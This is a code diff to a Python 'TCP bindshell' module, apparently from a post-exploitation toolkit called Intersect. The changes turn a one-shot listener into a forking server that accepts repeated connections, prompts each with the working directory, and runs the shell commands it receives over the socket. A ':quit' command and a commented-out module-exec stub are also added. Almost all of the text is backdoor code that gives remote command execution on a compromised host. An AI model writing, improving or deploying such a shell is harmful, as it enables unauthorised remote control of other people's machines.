@@ -6,16 +6,30 @@ def bshell():
     @short: TCP bindshell
     '''
     HOST = ''
-    socksize = 4096
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
     try:
+        log_msg("[ Bindshell module executed ]")
         server.bind((HOST, PORT))
-        server.listen(10)
-        conn, addr = server.accept()
+        server.listen(5)
     except:
         print "[!] Connection closed."
         sys.exit(2)
+                                
+    while 1:                                     
+        conn, addr = server.accept()
+        log_msg("New shell connection")
+        conn.send("\nIntersect "+str(os.getcwd())+" => ")
+        reaper()
+        childPid = os.fork()
+        if childPid == 0:
+            tcphandle(conn)
+        else:
+            shellPID.append(childPid)
+
+
+def tcphandle(conn):
+    time.sleep(3)
     
     while True:
         cmd = conn.recv(socksize)
@@ -76,13 +90,25 @@ def bshell():
 
         elif cmd.startswith(":exec"):
             pass
+            #getname = cmd.split(" ")
+            #mod = getname[1]
+            #if mod in modList:
+            #    mod = mod+"()"
+            #        exec mod
+            #else:
+            #    conn.send("Module not loaded!")
 
         elif cmd == (':killme'):
-            conn.send("[!] Shutting down shell!\n")
-            conn.close()
             sys.exit(0)
+
+        elif cmd == (':quit'):
+            conn.send("[!] Closing shell connection!\n")
+            conn.close()
+            os._exit(0)
 
         elif proc:
             conn.sendall( stdout )
             conn.send("\nIntersect "+str(os.getcwd())+" => ")
+
+
 
